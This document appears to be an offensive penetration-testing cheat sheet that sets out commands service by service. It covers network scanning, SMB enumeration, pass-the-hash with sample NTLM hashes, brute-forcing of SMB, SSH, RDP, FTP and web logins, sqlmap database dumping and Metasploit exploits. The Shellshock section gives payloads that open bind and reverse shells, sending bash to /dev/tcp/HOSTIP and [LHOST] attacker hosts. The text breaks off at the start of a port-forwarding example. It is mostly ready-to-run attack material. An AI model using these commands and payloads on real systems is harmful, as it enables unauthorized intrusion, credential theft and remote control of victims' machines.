# Network

## Scan for hosts <a id="scan-for-hosts"></a>

```text
nmap -sn $iprange -oG - | grep Up | cut -d' ' -f2 > network.txt
```

## Port scanning <a id="port-scanning"></a>

#### **TCP Top 1000:** <a id="tcp-top-1000"></a>

```text
nmap -Pn -sC -sV -oA tcp -vv $ip
```

#### **All TCP Ports:** <a id="all-tcp-ports"></a>

```text
nmap -Pn -sC -sV -oA all -vv -p- $ip
```

When you're getting no where with the TCP ports - try UDP ports. Easily forgotten about!

#### **UDP Top 100:** <a id="udp-top-100"></a>

```text
nmap -Pn -sU --top-ports 100 -oA udp -vv $ip
```

### Utilize nmap's scripts <a id="utilize-nmaps-scripts"></a>

#### What does a script do? <a id="what-does-a-script-do"></a>

```text
nmap --script-help ftp-anon
```

### Uniscan <a id="uniscan"></a>

#### Good nmap command <a id="good-nmap-command"></a>

```text
nmap -T4 -n -sC -sV -p- -oN nmap-versions --script='*vuln*' [ip]
```

### **unicornscan + nmap = onetwopunch** <a id="unicornscan-nmap-onetwopunch"></a>

Unicornscan supports asynchronous scans, speeding port scans on all 65535 ports. Nmap has powerful features that unicornscan does not have. With onetwopunch, unicornscan is used first to identify open ports, and then those ports are passed to nmap to perform further enumeration.

```text
./onetwopunch.sh -t targets.txt -i tun0 -n '-T4 -n -sC -sV -oN nmap-versions --script=*vuln*'
```

## Vulnerability scanning <a id="vulnerability-scanning"></a>

NSE scripts that scans for vulnerabilities are at `ls -l /usr/share/nmap/scripts/*vuln*`.

```text
nmap -p 80 --script=all $ip - Scan a target using all NSE scripts. May take an hour to complete.nmap -p 80 --script=*vuln* $ip - Scan a target using all NSE vuln scripts.nmap -p 80 --script=http*vuln* $ip  - Scan a target using all HTTP vulns NSE scripts.nmap -p 21 --script=ftp-anon $ip/24 - Scan entire network for FTP servers that allow anonymous access.nmap -p 80 --script=http-vuln-cve2010-2861 $ip/24 - Scan entire network for a directory traversal vulnerability. It can even retrieve admin's password hash.
```

### Search services vulnerabilities <a id="search-services-vulnerabilities"></a>

```text
searchsploit --exclude=dos -t apache 2.2.3
```

```text
msfconsole; > search apache 2.2.3
```

## DNS <a id="dns"></a>

Find name servers

### fierce <a id="fierce"></a>

Find email servers

Subdomain bruteforcing

```text
for ip in $(cat list.txt); do host $ip.$website; done
```

Reverse dns lookup bruteforcing

```text
for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"
```

Zone transfer request

Finds nameservers for a given domain

```text
host -t ns $ip| cut -d " " -f 4 #
```

Nmap zone transfer scan

```text
nmap $ip --script=dns-zone-transfer -p 53
```

Finds the domain names for a host.

Find the IP and authoritative servers.

Finds miss configure DNS entries.

TheHarvester finds subdomains in google, bing, etc

```text
python theHarvester.py  -l 500 -b all -d $ip
```

## SMB and SAMBA <a id="smb-and-samba"></a>

Server Message Block \(**SMB**\) Protocol is a network file sharing protocol, and as implemented in Microsoft **Windows**

**Samba** has provided secure, stable and fast file and print services for all clients using the SMB/CIFS protocol, such as all versions of DOS and Windows, OS/2, Linux and many others

#### SMB uses the following TCP and UDP ports: <a id="smb-uses-the-following-tcp-and-udp-ports"></a>

```text
netbios-ns 137/tcp # NETBIOS Name Servicenetbios-ns 137/udpnetbios-dgm 138/tcp # NETBIOS Datagram Servicenetbios-dgm 138/udpnetbios-ssn 139/tcp # NETBIOS session servicenetbios-ssn 139/udpmicrosoft-ds 445/tcp # if you are using Active Directory
```

### Checklist <a id="checklist"></a>

* Enumerate Hostname - `nmblookup -A $ip`
* List Shares
  * `smbmap -H $ip`
  * `echo exit | smbclient -L \\\\$ip`
  * `nmap --script smb-enum-shares -p 139,445 $ip`
* Check Null Sessions
  * `smbmap -H $ip`
  * `rpcclient -U "" -N $ip`
  * `smbclient \\\\$ip\\[share name]`
* Check for Vulnerabilities - `nmap --script smb-vuln* -p 139,445 $ip`
* Overall Scan - `enum4linux -a $ip`
* Manual Inspection
  * `smbver.sh $ip (port)`

mblookup — NetBIOS over TCP/IP client used to lookup NetBIOS names

### Scanning for the NetBIOS Service <a id="scanning-for-the-netbios-service"></a>

SMB NetBIOS service listens on TCP ports 139 and 445, as well as several UDP ports.

`nmap -p 139,445 --open -oG smb.txt 192.168.1.0/24`

`nbtscan -r 192.168.1.0/24`

#### Null Session Enumeration <a id="null-session-enumeration"></a>

**Vulnerable SMB Versions**

#### Vulnerable versions: <a id="vulnerable-versions-1"></a>

```text
Windows NT, 2000, and XP (most SMB1) - VULNERABLE: Null Sessions can be created by defaultWindows 2003, and XP SP2 onwards - NOT VULNERABLE: Null Sessions can't be created defaultMost Samba (Unix) servers
```

List of SMB versions and corresponding Windows versions:

```text
SMB1 – Windows 2000, XP and Windows 2003.SMB2 – Windows Vista SP1 and Windows 2008SMB2.1 – Windows 7 and Windows 2008 R2SMB3 – Windows 8 and Windows 2012.
```

Empty LM and NTLM hashes:

```text
Empty LM Hash: aad3b435b51404eeaad3b435b51404eeEmpty NT Hash: 31d6cfe0d16ae931b73c59d7e0c089c0
```

**rpcclient**

Manually probe a SMB server

```text
rpcclient -U '' $ipPassword:rpcclient $> srvinfo # operating system versionrpcclient $> netshareenumall # enumerate all shares and its pathsrpcclient $> enumdomusers # enumerate usernames defined on the serverrpcclient $> getdompwinfo # smb password policy configured on the server
```

Apparently the rpcclient version in OffSec VM does not work well with creating null sessions. A downgrade to samba-4.5.15 is required: [https://forums.offensive-security.com/showthread.php?12943-Found-solution-to-enum4linux-rpcclient-problem-NT\_STATUS\_INVALID\_PARAMETER&highlight=NT\_STATUS\_INVALID\_PARAMETER](https://forums.offensive-security.com/showthread.php?12943-Found-solution-to-enum4linux-rpcclient-problem-NT_STATUS_INVALID_PARAMETER&highlight=NT_STATUS_INVALID_PARAMETER) Place the export commands into a script and source it before using rpcclient to use the downgraded version, or place it in bashrc. NOTE, once downgraded, pth-winexe doesn't seem to work.

**enum4linux**

Wrapper around smb programs like `rpcclient` to automate enumerating an SMB server. Produces tons of results when a null session is successful. NOTE: Make sure to downgrade rpcclient before using.

```text
enum4linux -a $ipenum4linux -u 'guest' -p '' -a $ip
```

**CrackMapExec**

Works perfectly, list shares and permissions, enum users, disks, code execute and run modules like mimikatz. Hashes work. Also will tell you exact version of Windows

```text
crackmapexec -u 'guest' -p '' --shares $ipcrackmapexec -u 'guest' -p '' --rid-brute 4000 $ipcrackmapexec -u 'guest' -p '' --users $ipcrackmapexec smb 192.168.1.0/24 -u Administrator -p P@ssw0rdcrackmapexec smb 192.168.1.0/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949Bcrackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -M mimikatz 192.168.1.0/24crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -x whoami $ipcrackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B --exec-method smbexec -x whoami $ip# reliable pth code execution
```

Also will tell you exact version of windows:

![](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-LtC6WJ_9AZYlYnAktZI%2F-LtC8QYXbOrdewzYezqn%2Fimage.png?alt=media&token=a0a53930-bd20-463b-85b9-e81b5b680432)

**smbmap**

Works well for listing and downloading files, and listing shares and permissions. Hashes work. Code execution don't work.

```text
smbmap -u '' -p '' -H $ip # similar to crackmapexec --sharessmbmap -u guest -p '' -H $ipsmbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ipsmbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -r # list top level dirsmbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -R # list everything recursivelysmbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -s wwwroot -R -A '.*' # download everything recursively in the wwwroot share to /usr/share/smbmap. great when smbclient doesnt worksmbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -x whoami # no work
```

**​**

generally works a bit better than enum4linux as it enum4linux tends to error out a bit

downloads to the `/usr/share/smbmap` directory

```text
smb: \> RECURSE ONsmb: \> PROMPT OFFsmb: \> mget *
```

#### Download all  <a id="download-all"></a>

```text
smbmap -R $sharename -H $ip -A $fileyouwanttodownload -q #downloads a file in quiet mode
```

```text
smbmap -R $sharename -H $ip #Recursively list dirs, and files
```

default port it checks is 445, use -P 139 to point it at that port if 445 fails

### **smbclient** <a id="smbclient"></a>

Access SMB shares interactively, seems to work with anonymous access. Hashes don't work.

```text
smbclient //$ip/wwwrootsmbclient //$ip/C$ WIN20082017 -U Administratorsmbclient //$ip/C$ A433F6C2B0D8BB92D7288ECFFACFC7CD -U Administrator --pw-nt-hash # make sure to only use the NT portion of the hash
```

WARNING, be careful when using the `get` command to download absolute path files from the remote system. Eg. `get /etc/passwd` will download the passwd file and overwrite YOUR `/etc/passwd`. Use `get /etc/passwd /tmp/passwd` instead.

To download recursively:

```text
# Within smbclient, download everything recursively:mask ""recurse ONprompt OFFcd 'path\to\remote\dir'lcd '~/path/to/download/to/'mget *
```

**pth-winexe**

Works great sometimes. Can open a windows cmd shell.

```text
pth-winexe -U administrator%WIN20082017 //$ipcmd # using a plaintext passwordpth-winexe -U Administrator%A433F6C2B0D8BB92D7288ECFFACFC7CD //$ipcmd # ntlm hash encrypted with https://www.browserling.com/tools/ntlm-hashpth-winexe -U domain/user%A433F6C2B0D8BB92D7288ECFFACFC7CD //$ipcmd # domain userpth-winexe -U Administrator%8F49412C8D29DF02FB62879E33FBB745:A433F6C2B0D8BB92D7288ECFFACFC7CD //$ip cmd # lm+ntlm hash encrypted with https://asecuritysite.com/encryption/lmhashpth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:A433F6C2B0D8BB92D7288ECFFACFC7CD //$ip cmd # ntlm hash + empty lm hash# orexport SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896pth-winexe -U Administrator% //$ip cmd
```

#### smbenum.sh <a id="smbenum-sh"></a>

```text
#!/bin/bash​#SMB Enumeration using nmap#(c) Mike Digital Offensive​if [ -z "$1" ] then  echo "Error please provide host to enumerate"  exitelse nmap -script=smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse $1fi
```

### Samba version checker <a id="samba-version-checker"></a>

#### smbver.sh <a id="smbver-sh"></a>

```text
#!/bin/sh#Author: rewardone#Description:# Requires root or enough permissions to use tcpdump# Will listen for the first 7 packets of a null login# and grab the SMB Version#Notes:# Will sometimes not capture or will print multiple# lines. May need to run a second time for success.if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fiif [ ! -z $2 ]; then rport=$2; else rport=139; fitcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/nullecho "" && sleep .1 
```

Used to enumerate data from Windows and Samba hosts and is a wrapper for `smbclient`, `rpcclient`, `net` and `nmblookup`

Look for users, groups, shares, workgroup/domains and password policies

list smb nmap scripts

### find SAMBA version number using the SMB OS discovery script: <a id="find-samba-version-number-using-the-smb-os-discovery-script"></a>

then google to see if version is vulnerable

```text
SAMBA 3.x-4.x #  vulnerable to linux/samba/is_known_pipenameSAMBA 3.5.11 # vulnerable to linux/samba/is_known_pipename
```

### ​ <a id="undefined-1"></a>

![](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-Lln3alIOr4NN3ziQWGc%2F-Lln3efKcKUx6K2FFgXI%2Fimage.png?alt=media&token=8d9868e9-5848-4301-8202-fa37ca6c1a57)

Use the GUI to browse and download ^ example above

#### Brute force login <a id="brute-force-login"></a>

```text
medusa -h $ip -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbntnmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt $ip  -vvvv
```

### RID <a id="rid"></a>

Rid Enum is a RID cycling attack that attempts to enumerate user accounts through null sessions and the SID to RID enum. If you specify a password file, it will automatically attempt to brute force the user accounts when its finished enumerating.

```text
https://tools.kali.org/maintaining-access/ridenum
```

### Null Session <a id="null-session"></a>

A null SMB session can be used to gather passwords and useful information from SMB 1 by looking in shares that are not password protected for interesting files. Windows NT/2000 XP default settings allow this. Windows 2003/XP SP2 SMB this behaviour is disabled.

#### Null session and extract information. <a id="null-session-and-extract-information"></a>

#### Version <a id="version"></a>

```text
msfconsole; use auxiliary/scanner/smb/smb_version; set RHOSTS $ip; run
```

MultiExploit

```text
msfconsole; use exploit/multi/samba/usermap_script; set lhost 10.10.14.x; set rhost $ip; run
```

#### Show all nmap SMB scripts <a id="show-all-nmap-smb-scripts"></a>

```text
ls -ls /usr/share/nmap/scripts/smb*
```

Quick enum:

```text
nmap --script=smb-enum* --script-args=unsafe=1 -T5 $ip
```

Quick vuln scan:

```text
nmap --script=smb-vuln* --script-args=unsafe=1 -T5 $ip
```

Full enum and vuln scanning:

```text
nmap --script=smb2-capabilities,smb-print-text,smb2-security-mode.nse,smb-protocols,smb2-time.nse,smb-psexec,smb2-vuln-uptime,smb-security-mode,smb-server-stats,smb-double-pulsar-backdoor,smb-system-info,smb-vuln-conficker,smb-enum-groups,smb-vuln-cve2009-3103,smb-enum-processes,smb-vuln-cve-2017-7494,smb-vuln-ms06-025,smb-enum-shares,smb-vuln-ms07-029,smb-enum-users,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-ls,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-os-discovery --script-args=unsafe=1 -T5 $ip
```

Full enum & vuln scan:

```text
nmap -p139,445 -T4 -oN smb_vulns.txt -Pn --script 'not brute and not dos and smb-*' -vv -d $ip
```

Mount:

```text
smbclient //$ip/share -U username
```

Anonymous mount:

```text
smbclient //$ip/share # hit enter with blank password
```

### Eternal Blue <a id="eternal-blue"></a>

Exploits a critical vulnerability in the SMBv1 protocol

Worth testing Eternal blue - you might get lucky although \(the system should be patched to fix this\)

### Vulnerable versions <a id="vulnerable-versions"></a>

Windows 7, 8, 8.1 and Windows Server 2003/2008/2012\(R2\)/2016

```text
nmap -p 445 $ip --script=smb-vuln-ms17-010
```

Bruteforce

```text
hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 1 $ip smb
```

Any metasploit exploit through Netbios over TCP in 139, you need to set:

## NFS <a id="nfs"></a>

Show all mounts

Mount a NFS share

```text
mount $ip:/vol/share /mnt/nfs
```

Use nfspy to mount a share. Will get around permission errors

```text
nfspysh -o server=$ip:/home/vulnix/
```

## Web <a id="web"></a>

If you get a certificate redirecting you to 443/https check for alt names

![](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-LmAPTQFRFuYL8Au2w4o%2F-LmAPwWxje2lAdcsinij%2Fimage.png?alt=media&token=b012c5e8-64bb-4e2b-9c5d-3890938fde97)

add these to /etc/hosts file

```text
nikto -h $ipnikto -h $ip -p 80,8080,1234 #test different ports with one scan
```

```text
-Tuning Options0 – File Upload1 – Interesting File / Seen in logs2 – Misconfiguration / Default File3 – Information Disclosure4 – Injection (XSS/Script/HTML)5 – Remote File Retrieval – Inside Web Root6 – Denial of Service7 – Remote File Retrieval – Server Wide8 – Command Execution / Remote Shell9 – SQL Injectiona – Authentication Bypassb – Software Identificationc – Remote Source Inclusionx – Reverse Tuning Options (i.e., include all except specified)
```

```text
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/Top1000-RobotsDisallowed.txt; gobuster -u http://$ip -w Top1000-RobotsDisallowed.txt
```

### Directory Discovery <a id="directory-discovery"></a>

use a few different files, check seclists for web discovery

```text
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200 http://$ip/FUZZ
```

It is worth scanning using a good number of word lists as well as scanning the directories recursively - which takes time. Its good to refer back to your findings when you're stuck. It may help you find where shells have been uploaded to.

```text
https://github.com/PinkP4nther#follow guide, might have to run these commands if guide doesnt work then re run guideapt install cargo, apt install pkg-config./erodir -u http:/$ip -e /usr/share/wordlists/dirb/common.txt -t 20
```

```text
gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php -o gobuster-root -t 50
```

```text
cd /root/dirsearch; python3 dirsearch.py  -u http://$ip/ -e .php
```

#### If really stuck run this <a id="if-really-stuck-run-this"></a>

```text
for file in $(ls /usr/share/seclists/Discovery/Web-Content); do gobuster -u http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/$file -e -k -l -s "200,204,301,302,307" -t 20 ; done
```

```text
./whatweb $ip # identifies all known services
```

#### Methods testing <a id="methods-testing"></a>

```text
nmap --script http-methods --script-args http-methods.url-path='/test' $ip
```

#### Brute Forcing authentication <a id="brute-forcing-authentication"></a>

```text
hydra 10.0.0.1 http-post-form "/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid" -P /usr/share/wordlists/rockyou.txt -l admin
```

#### Vulnerability scanning: <a id="vulnerability-scanning-1"></a>

```text
nmap --script=http-vuln* $ip 
```

#### Test against SQLI <a id="test-against-sqli"></a>

```text
sqlmap -u "http://$ip/?query" --data="user=foo&pass=bar&submit=Login" --level=5 --risk=3 --dbms=mysql  
```

#### Coldfusion vulnerability scanning <a id="coldfusion-vulnerability-scanning"></a>

```text
nmap -v -p 80 --script=http-vuln-cve2010-2861 $ip
```

#### Brute force basic auth <a id="brute-force-basic-auth"></a>

```text
hydra -l user -P /usr/share/wordlists/rockyou.txt -f $ip http-get /path
```

If you can **register yourself** on the site like a normal users - do this. There maybe an upload feature of the site which you can take advantage of.

### Backup files search <a id="backup-files-search"></a>

```text
./bfac --url http://$ip/ --level 4
```

### WebDav <a id="webdav"></a>

Test for it

```text
davtest -move -sendbd auto -url http://$ip:8080/webdav/
```

```text
cadaver http://$ip:8080/webdav/
```

## Mysql <a id="mysql"></a>

```text
nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $ip -p 3306
```

#### Nmap scan <a id="nmap-scan"></a>

```text
nmap -sV -Pn -vv -script=mysql* $ip -p 3306
```

#### Vuln scanning: <a id="vuln-scanning"></a>

```text
sqlmap -u 'http://$ip/login-off.asp' --method POST  --data 'txtLoginID=admin&txtPassword=aa&cmdSubmit=Login' --all --dump-all
```

If Mysql is running as root and you have access, you can run commands:

```text
mysql> select do_system('id');mysql> \! sh
```

#### Enumerate MSSQL Servers on the network <a id="enumerate-mssql-servers-on-the-network"></a>

```text
msf > use auxiliary/scanner/mssql/mssql_pingnmap -sU --script=ms-sql-info $ip
```

#### Bruteforce MsSql <a id="bruteforce-mssql"></a>

```text
msf auxiliary(mssql_login) > use auxiliary/scanner/mssql/mssql_login
```

#### Gain shell using gathered credentials <a id="gain-shell-using-gathered-credentials"></a>

```text
msf > use exploit/windows/mssql/mssql_payloadmsf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
```

#### Log in to a MsSql server: <a id="log-in-to-a-mssql-server"></a>

```text
# root@kali:~/dirsearch# cat ../.freetds.conf[someserver]host = $ipport = 1433tds version = 8.0user=sa​root@kali:~/dirsearch# sqsh -S someserver -U sa -P PASS -D DB_NAME
```

## SMTP <a id="smtp"></a>

Always do users enumeration

```text
for server in $(cat smtpmachines); do echo "******************" $server "*****************"; smtp-user-enum -M VRFY -U userlist.txt -t $server;done #for multiple servers
```

```text
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ipsmtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt  -t $ip
```

```text
use auxiliary/scanner/smtp/smtp_enum
```

Command to check if a user exists

Command to ask the server if a user belongs to a mailing list

Enumeration and vuln scanning:

```text
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $ip
```

#### Bruteforce <a id="bruteforce"></a>

```text
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
```

#### Metasploit user enumeration <a id="metasploit-user-enumeration"></a>

```text
use auxiliary/scanner/smtp/smtp_enum
```

#### Testing for open relay <a id="testing-for-open-relay"></a>

```text
telnet $ip 25EHLO rootMAIL FROM:root@target.comRCPT TO:example@gmail.comDATASubject: Testing open mail relay.Testing SMTP open mail relay. Have a nice day..QUIT
```

## RPC \(135\) <a id="rpc-135"></a>

#### Enumerate, shows if any NFS mount exposed: <a id="enumerate-shows-if-any-nfs-mount-exposed"></a>

```text
nmap $ip --script=msrpc-enum
```

```text
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

## FTP enumeration <a id="ftp-enumeration"></a>

#### Enumerate: <a id="enumerate"></a>

```text
nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $ip
```

#### Bruteforce <a id="bruteforce-1"></a>

```text
hydra -l user -P /usr/share/john/password.lst ftp://$ip:21
```

#### Bruteforce with metasploit <a id="bruteforce-with-metasploit"></a>

```text
msfconsole -q msf> search type:auxiliary login: msf> use auxiliary/scanner/ftp/ftp_login
```

#### Vuln scan <a id="vuln-scan"></a>

```text
nmap --script=ftp-* -p 21 $ip
```

### TFTP <a id="tftp"></a>

If unauthenticated access is allowed with write permissions you can upload a shell:

```text
tftp $iptftp> ls?Invalid commandtftp> verboseVerbose mode on.tftp> put shell.phpSent 3605 bytes in 0.0 seconds [inf bits/sec]
```

```text
nmap -sU -p 69 --script tftp-enum.nse $ip 
```

or

```text
use auxiliary/scanner/tftp/tftpbrute
```

`connecting/interacting: tftp $ip tftp> put payload.exe tftp> get file.txt`

## SSH <a id="ssh"></a>

#### User enumeration <a id="user-enumeration"></a>

```text
use auxiliary/scanner/ssh/ssh_enumusersset user_file /usr/share/wordlists/metasploit/unix_users.txtorset user_file /usr/share/seclists/Usernames/Names/names.txtrun
```

```text
python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/wordlists/metasploit/unix_users.txt $ip
```

#### Bruteforce <a id="bruteforce-2"></a>

```text
hydra -v -V -l root -P password-file.txt $ip ssh
```

#### With list of users: <a id="with-list-of-users"></a>

```text
hydra -v -V -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 192.168.33.251 ssh
```

* You can use **-w** to slow down

## SSL <a id="ssl"></a>

#### Open a connection <a id="open-a-connection"></a>

```text
openssl s_client -connect $ip:443
```

#### Basic SSL ciphers check <a id="basic-ssl-ciphers-check"></a>

```text
nmap --script ssl-enum-ciphers -p 443 $ip
```

* Look for unsafe ciphers such as Triple-DES and Blowfish
* Very complete tool for SSL auditing is testssl.sh, finds BEAST, FREAK, POODLE, heart bleed, etc...

## SNMP <a id="snmp"></a>

### Enumeration <a id="enumeration"></a>

enumerate Community strings

```text
./onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.11.1.73
```

Community string too long If you see this download onesixtyone from Github and run it there

#### v1 <a id="v1"></a>

```text
snmp-check -t $ip -c public
```

use nmap to enumerate info

```text
nmap -sU -p161 --script "snmp-*" $ip
```

### snmpwalk <a id="snmpwalk"></a>

```text
apt install snmp-mibs-downloader #translates MIBs into readable format
```

```text
for community in public private manager; do snmpwalk -c $community -v1 $ip; donesnmpwalk -c public -v1 $ipsnmpenum $ip public windows.txt
```

Less noisy:

```text
snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25
```

Based on UDP, stateless and susceptible to UDP spoofing

```text
nmap -sU --open -p 16110.1.1.1-254 -oG out.txt
```

```text
snmpwalk -c public -v1  10.1.1.1 # we need to know that there is a community called publicsnmpwalk -c public -v1 192.168.11.204 1.3.6.1.4.1.77.1.2.25 # enumerate windows userssnmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2 # enumerates running processes
```

```text
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $ip
```

## POP3 <a id="pop3"></a>

### Test authentication: <a id="test-authentication"></a>

```text
telnet $ip 110USER uer@$ipPASS adminlistretr 1
```

## Finger <a id="finger"></a>

### port 79 <a id="port-79"></a>

```text
https://touhidshaikh.com/blog/?p=914
```

### **Find Logged in users on target.** <a id="find-logged-in-users-on-target"></a>

```text
finger @$ipif there is no user logged in this will show no username
```

#### **Check User is existed or not.** <a id="check-user-is-existed-or-not"></a>

The finger command is very useful for checking users on target but it’s painful if brute-forced for a username.

```text
use auxiliary/scanner/finger/finger_usersset rhosts $ipset users_file run
```

```text
cd /tmp/wget http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gztar -xvf finger-user-enum-1.0.tar.gzcd finger-user-enum-1.0perl finger-user-enum.pl -t 10.22.1.11 -U /tmp/rockyou-top1000.txt
```

## RDP <a id="rdp"></a>

Install RDP nmap scripts

```text
https://fadedlab.wordpress.com/2019/06/13/using-nmap-to-extract-windows-info-from-rdp/amp/
```

```text
nmap -p 3389 --script rdp-ntlm-info $ip
```

#### Bruteforce <a id="bruteforce-3"></a>

```text
ncrack -vv --user administrator -P password-file.txt rdp://$ip
```

```text
hydra -t 4  -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
```

## Kerberos <a id="kerberos"></a>

Test MS14-068

## LDAP <a id="ldap"></a>

#### Enumeration: <a id="enumeration-1"></a>

```text
ldapsearch -h $ip -p 389 -x -b "dc=mywebsite,dc=com"
```

## Email addresses enumeration <a id="email-addresses-enumeration"></a>

Find emails in google, bing, pgp etc

```text
theharvester -d $ip -b google
```

Contact information for the domains they host

Find emails and employee name with Recon-ng:

```text
recon-ng; use module; set DOMAIN $ip; run;recon/contacts/gather/http/api/whois_pocs
```

Find xss published ad xssed.co

```text
recon/hosts/enum/http/web/xssed
```

Find subdomain

```text
recon/hosts/gather/http/web/google_site
```

Finds IPs close to the domain and possible new domains

```text
recon/hosts/gather/http/web/ip_neighbor
```

Google search

* site:xxx -site:www.xxx
* filetype: look for specific documents, pdf, docx, etc..
* inurl
* intitle
* Others https://www.exploit-db.com/google-hacking-database/

OpenVAS

* Powerful vulnerability scanner with thousands of scan checks. Setup:

```text
openvas-setup; openvas-adduser; gsd
```

## Well known exploits <a id="well-known-exploits"></a>

### Shellshock <a id="shellshock"></a>

The following tool will test it.

```text
git clone https://github.com/nccgroup/shocker; cd shocker; ./shocker.py -H $ip  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H $ip  --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
```

You can also:

```text
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc $ip 80
```

```text
curl -x TARGETADDRESS -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/HOSTIP/1234 0>&1" $ip/cgi-bin/status
```

Shellshock over SSH:

```text
ssh username@$ip '() { :;}; /bin/bash'
```

Exploit shellshock via curl, use -k switch to force curl to bypass any SSL warnings. Replace the bash command with anything.

```text
curl http://192.168.123.123/path/to/cgi- bin/name_of_vuln_cgi -H "custom:() { ignored; }; /bin/bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1 "
```

### HeartBleed <a id="heartbleed"></a>

Test web server

### Internet explorer 6 <a id="internet-explorer-6"></a>

Vulnerable to msf exploit\(ms10\_002\_aurora\)

## Tunneling your traffic through another host <a id="tunneling-your-traffic-through-another-host"></a>

* ```text
  sshuttle -r root@$ip 10.10.10.0/24
  ```

### Port forwarding <a id="port-forwarding"></a>

Simplest type of traffic redirection, consists on accepting traffic from one address and port port and redirecting it to another address and port.

It can be useful to bypass address and port based filters. Rinetd is a linux tool to do it.

### Local port forwarding <a id="local-port-forwarding"></a>

Creates an encrypted tunnel through two machines and have traffic redirected to a final host and port, similar to port forwarding This is useful when you are trying to connect from your machine to a destination using a gateway. The syntax is:

```text
ssh gateway_host -L local_port:remote_host:remote_port
```

You can later create a SSH session to the local port and have and SSH tunneled to destination:

```text
ssh hop_machine -L 31337:banned_machine:22ssh -p 31337 localhost
```

### Remote port forwarding <a id="remote-port-forwarding"></a>

It creates a tunnel from the target machine to your local machine, which allows connecting to an arbitrary port on the target. Useful if the target is in a non-routable network from your local machine. This is useful when you are trying to connect to a host, behind a firewall that blocks incoming connections. This technique works as the previous one, but the connection is started from the gateway. The syntax is:

```text
